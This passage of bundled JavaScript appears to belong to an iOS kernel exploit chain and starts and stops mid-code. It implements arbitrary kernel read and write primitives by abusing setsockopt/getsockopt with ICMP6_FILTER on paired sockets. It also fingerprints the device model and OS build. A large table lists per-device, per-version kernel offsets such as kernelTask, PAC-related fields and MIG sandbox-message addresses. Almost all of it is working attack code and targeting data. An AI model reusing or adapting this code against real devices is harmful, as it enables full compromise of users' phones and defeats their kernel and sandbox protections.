libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.nextTask);\n\t\t\t\telse \n\t\t\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.prevTask);\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t}\n\t\treturn false;\n\t}\n\n\t#kreadLength(address, buffer, size) {\n\t\t\n\n\t\tlet remaining = BigInt(size);\n\t\tlet read_offset = 0n;\n\t\tlet read_size = 0n;\n\t\n\t\twhile (remaining != 0n) {\n\t\t\tif (remaining >= EARLY_KRW_LENGTH) {\n\t\t\t\tread_size = EARLY_KRW_LENGTH;\n\t\t\t} else {\n\t\t\t\tread_size = remaining % EARLY_KRW_LENGTH;\n\t\t\t}\n\t\t\tif (!this.#kread32Bytes(address + read_offset, buffer + read_offset, read_size))\n\t\t\t\treturn false;\n\t\t\tremaining -= read_size;\n\t\t\tread_offset += read_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\t#kwriteLength(address, buffer, size) {\n\t\t\n\n\t\tlet remaining = BigInt(size);\n\t\tlet write_offset = 0n;\n\t\tlet write_size = 0n;\n\t\n\t\twhile (remaining != 0n) {\n\t\t\tif (remaining >= EARLY_KRW_LENGTH) {\n\t\t\t\twrite_size = EARLY_KRW_LENGTH;\n\t\t\t} else {\n\t\t\t\twrite_size = remaining % EARLY_KRW_LENGTH;\n\t\t\t}\n\t\n\t\t\tlet kwrite_dst_addr = address + write_offset;\n\t\t\tlet kwrite_src_addr = buffer + write_offset;\n\t\n\t\t\tif (write_size != EARLY_KRW_LENGTH) {\n\t\t\t\tif (!this.#kread32Bytes(kwrite_dst_addr, this.#tmpWriteMem, EARLY_KRW_LENGTH))\n\t\t\t\t\treturn false;\n\t\t\t\tNative.callSymbol(\"memcpy\", this.#tmpWriteMem, kwrite_src_addr, write_size);\n\t\t\t\tkwrite_src_addr = this.#tmpWriteMem;\n\t\t\t}\n\t\n\t\t\tif (!this.#kwrite32Bytes(kwrite_dst_addr, kwrite_src_addr))\n\t\t\t\treturn false;\n\t\t\tremaining -= write_size;\n\t\t\twrite_offset += write_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\t#kread32Bytes(kaddr, buffer, len) {\n\t\tconst tmpBuff = Native.mem + 0x1000n;\n\n\t\t\n\t\tlet buff = new BigUint64Array(4);\n\t\tbuff[0] = kaddr;\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tlet ret = Native.callSymbol(\"setsockopt\", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt: \" + ret);\n\t\t\treturn false;\n\t\t}\n\n\t\tbuff[0] = BigInt(len);\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tret = Native.callSymbol(\"getsockopt\", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, tmpBuff);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"getsockopt failed reading \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kaddr));\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n\t#kwrite32Bytes(kaddr, buffer) {\n\t\tconst tmpBuff = Native.mem + 0x1000n;\n\n\t\t\n\t\tlet buff = new BigUint64Array(4);\n\t\tbuff[0] = kaddr;\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tlet ret = Native.callSymbol(\"setsockopt\", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt: \" + ret);\n\t\t\treturn false;\n\t\t}\n\n\t\tret = Native.callSymbol(\"setsockopt\", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt failed writing \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kaddr));\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n}\n\n\n }),\n\n \"./src/libs/Driver/Offsets.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( Offsets)\n });\n var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/Chain/OffsetsStruct.js\");\n var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( \"./src/libs/Driver/OffsetsTable.js\");\n\n\n\nconst TAG  = \"OFFSETS\"\n\nclass Offsets\n{\n\tstatic getByDeviceAndVersion()\n\t{\n\t\tNative.callSymbol(\"uname\", Native.mem);\n\t\tconst sysname = Native.readString(Native.mem, 0x100);\n\t\tconst nodename = Native.readString(Native.mem + 0x100n, 0x100);\n\t\tconst release = Native.readString(Native.mem + 0x200n, 0x100);\n\t\tconst version = Native.readString(Native.mem + 0x300n, 0x100);\n\t\tconst machine = Native.readString(Native.mem + 0x400n, 0x100);\n\t\tconsole.log(TAG, `release: ${release} with machine: ${machine}`);\n\n\t\tconst buildVer = this.getBuildVersion();\n\t\tconsole.log(TAG, \"Build version: \" + buildVer);\n\n\t\tlet splittedVersion = release.split(\".\");\n\t\tlet xnuMajor = splittedVersion[0];\n\t\tlet xnuMinor = splittedVersion[1];\n\n\t\tlet splittedMachine = machine.split(\",\");\n\t\tlet deviceFamily = splittedMachine[0];\n\t\tlet deviceModel = splittedMachine[1];\n\n\t\tconsole.log(TAG, \"deviceFamily: \" + deviceFamily);\n\n\t\t\n\t\tif (buildVer) {\n\t\t\tif (buildVer == \"21H16\")\n\t\t\t\txnuMinor = 6.1;\n\t\t\telse if (buildVer == \"21H216\")\n\t\t\t\txnuMinor = 6.2;\n\t\t\telse if (buildVer == \"21H221\")\n\t\t\t\txnuMinor = 6.3;\n\t\t}\n\t\t\n\t\tlet deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__.offsets[deviceFamily];\n\t\tif (!deviceOffsets) {\n\t\t\tconsole.log(TAG, `Unsupported machine: ${machine}`);\n\t\t\treturn null;\n\t\t}\n\n\t\tlet familyOffsets = deviceOffsets[\"*\"];\n\t\tlet foundFamilyOffsets = this.#getOffsetsByVersion(familyOffsets, xnuMajor, xnuMinor);\n\n\t\tif (!foundFamilyOffsets)\n\t\t\treturn null;\n\n\t\t\n\t\tlet modelOffsets = deviceOffsets[deviceModel];\n\t\tlet foundModelOffsets = null;\n\t\tif (modelOffsets)\n\t\t\tfoundModelOffsets = this.#getOffsetsByVersion(modelOffsets, xnuMajor, xnuMinor);\n\n\t\t\n\t\tlet foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"]();\n\t\tObject.assign(foundOffsets, foundFamilyOffsets);\n\t\tif (foundModelOffsets)\n\t\t\tObject.assign(foundOffsets, foundModelOffsets);\n\n\t\tif ([\"iPhone15\", \"iPhone16\", \"iPhone17\"].includes(deviceFamily))\n\t\t\tfoundOffsets.T1SZ_BOOT = 17n;\n\t\telse\n\t\t\tfoundOffsets.T1SZ_BOOT = 25n;\n\n\t\tconsole.log(TAG, \"Offsets: \" + JSON.stringify(foundOffsets, (_,v) => typeof v === 'bigint' ? \"0x\"+v.toString(16) : v, 2));\n\n\t\treturn foundOffsets;\n\t}\n\n\tstatic #getOffsetsByVersion(offsets, xnuMajor, xnuMinor) {\n\t\tlet xnuMajorOffsets = 0;\n\t\tfor (let major in offsets) {\n\t\t\tif (xnuMajor < major)\n\t\t\t\tcontinue;\n\t\t\tif (xnuMajorOffsets < major)\n\t\t\t\txnuMajorOffsets = major;\n\t\t}\n\n\t\tif (!xnuMajorOffsets) {\n\t\t\tconsole.log(TAG, \"Unsupported XNU major: \" + xnuMajor);\n\t\t\treturn null;\n\t\t}\n\n\t\t\n\t\txnuMajorOffsets = offsets[xnuMajorOffsets];\n\n\t\tlet foundOffsets = {};\n\t\tlet xnuMinorOffsets = -1;\n\t\tconst sortedMinors = Object.keys(xnuMajorOffsets).sort();\n\t\tfor (let minor of sortedMinors) {\n\t\t\t\n\t\t\tif (minor > xnuMinor)\n\t\t\t\tbreak;\n\t\t\tif (xnuMinorOffsets < minor) {\n\t\t\t\txnuMinorOffsets = minor;\n\t\t\t\tObject.assign(foundOffsets, xnuMajorOffsets[minor]);\n\t\t\t}\n\t\t}\n\n\t\t\n\n\t\treturn foundOffsets;\n\t}\n\tstatic getBuildVersion() {\n\t\tconst CTL_KERN = 1;\n\t\tconst KERN_OSVERSION = 65;\n\n\t\tconst mib = new ArrayBuffer(4 * 2);\n\t\tconst mibView = new DataView(mib);\n\t\tmibView.setInt32(0, CTL_KERN, true);\n\t\tmibView.setInt32(4, KERN_OSVERSION, true);\n\n\t\tconst mibAddr = Native.mem;\n\t\tconst resultAddr = Native.mem + 0x100n;\n\t\tconst lengthAddr = Native.mem + 0x200n;\n\n\t\tNative.write(Native.mem, mib);\n\n\t\tlet ret = Native.callSymbol(\"sysctl\", mibAddr, 2, resultAddr, lengthAddr, null, 0);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"Unable to get iOS build version\");\n\t\t\treturn null;\n\t\t}\n\n\t\tconst length = Native.read32(lengthAddr);\n\t\tconst buildVer = Native.readString(resultAddr, length);\n\t\treturn buildVer;\n\t}\n}\n\n\n }),\n\n \"./src/libs/Driver/OffsetsTable.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   offsets: () => ( offsets)\n });\nconst offsets = {\n\t\n\t\n\t\n\t\n\t\"iPhone11\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xe8n,\n\t\t\t\t\tropPid: 0x150n,\n\t\t\t\t\tjopPid: 0x158n,\n\t\t\t\t\tguardExcCode: 0x308n,\n\t\t\t\t\ttaskThreads: 0x348n,\n\t\t\t\t\ttro: 0x358n,\n\t\t\t\t\tast: 0x37cn,\n\t\t\t\t\tmutexData: 0x380n,\n\t\t\t\t\tctid: 0x408n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x918210n,\n\t\t\t\t\tguardExcCode: 0x318n,\n\t\t\t\t\ttaskThreads: 0x358n,\n\t\t\t\t\ttro: 0x368n,\n\t\t\t\t\tast: 0x38cn,\n\t\t\t\t\tmutexData: 0x398n,\n\t\t\t\t\tctid: 0x418n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x91c638n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x320n,\n\t\t\t\t\ttaskThreads: 0x360n,\n\t\t\t\t\ttro: 0x370n,\n\t\t\t\t\tast: 0x394n,\n\t\t\t\t\tmutexData: 0x3a0n,\n\t\t\t\t\tctid: 0x420n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x920a90n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9209f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x920a40n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f1548n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x320n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f1560n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x370n,\n\t\t\t\t\tast: 0x394n,\n\t\t\t\t\tmutexData: 0x3a0n,\n\t\t\t\t\tctid: 0x420n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fd988n,\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f5988n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa62b50n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6ac38n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6ad48n,\n  \t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x378n,\n  \t\t\t\t\ttro: 0x380n,\n  \t\t\t\t\tast: 0x3a4n,\n  \t\t\t\t\tmutexData: 0x3b0n,\n  \t\t\t\t\tctid: 0x430n,\n  \t\t\t\t\tmigLock: 0x36971f0n,\n  \t\t\t\t\tmigSbxMsg: 0x3697210n,\n  \t\t\t\t\tmigKernelStackLR: 0x2f7c1a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x8fc638n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x900a90n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9009f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x900a40n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9d1548n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9d1560n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9d9988n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9d1988n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa42b50n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n,\n\t\t\t\t\tmigLock: 0x38d74e8n,\n\t\t\t\t\tmigSbxMsg: 0x38d7508n,\n\t\t\t\t\tmigKernelStackLR: 0x31b19e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa4ad48n,\n\t\t\t\t\tmigLock: 0x352e1f0n,\n\t\t\t\t\tmigSbxMsg: 0x352e210n,\n\t\t\t\t\tmigKernelStackLR: 0x2e5ba20n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t\n\t\n\t\n\t\n\t\"iPhone12\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x96c178n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x970588n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9749d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa494a0n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa518c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa498c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n  \t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n  \t\t\t\t\ttro: 0x390n,\n  \t\t\t\t\tast: 0x3b4n,\n  \t\t\t\t\tmutexData: 0x3c0n,\n  \t\t\t\t\tctid: 0x440n,\n\t\t\t\t\tmigLock: 0x38e34e8n,\n\t\t\t\t\tmigSbxMsg: 0x38e3508n,\n\t\t\t\t\tmigKernelStackLR: 0x31ba7a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"3\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x974588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9789d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa4d4a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa558c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa4d8c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n\t\t\t\t\tmigLock: 0x38e7468n,\n\t\t\t\t\tmigSbxMsg: 0x38e7488n,\n\t\t\t\t\tmigKernelStackLR: 0x31bf5a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x974588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9789d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa4d4a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa558c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa4d8c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n\t\t\t\t\tmigLock: 0x38e7468n,\n\t\t\t\t\tmigSbxMsg: 0x38e7488n,\n\t\t\t\t\tmigKernelStackLR: 0x31bf5a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x960588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9649d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x964938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x964988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa35488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa354a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3d8c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa358c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xab6a90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xabeb78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xac2c88n,\n\t\t\t\t\tmigLock: 0x387a8e8n,\n\t\t\t\t\tmigSbxMsg: 0x387a908n,\n\t\t\t\t\tmigKernelStackLR: 0x3156f20n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t\n\t\n\t\n\t\n\t\"iPhone13\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x318n,\n\t\t\t\t\ttaskThreads: 0x358n,\n\t\t\t\t\ttro: 0x368n,\n\t\t\t\t\tast: 0x38cn,\n\t\t\t\t\tmutexData: 0x390n,\n\t\t\t\t\tctid: 0x418n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x94c2d0n,\n\t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x9546e0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x954b30n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x954a90n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x954ae0n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa295e0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2d5f8n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa35a20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa2da20n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa9ebe8n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n,\n\t\t\t\t\tmigLock: 0x37b8b80n,\n\t\t\t\t\tmigSbxMsg: 0x37b8ba0n,\n\t\t\t\t\tmigKernelStackLR: 0x3190fa0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa6cd0n,\n\t\t\t\t\tmigLock: 0x37d4c90n,\n\t\t\t\t\tmigSbxMsg: 0x37d4cb0n,\n\t\t\t\t\tmigKernelStackLR: 0x31acce4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaaade0n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n,\n\t\t\t\t\tmigLock: 0x37dcc90n,\n\t\t\t\t\tmigSbxMsg: 0x37dccb0n,\n\t\t\t\t\tmigKernelStackLR: 0x31b5b60n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\"iPhone14\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x918ee0n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x91d318n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 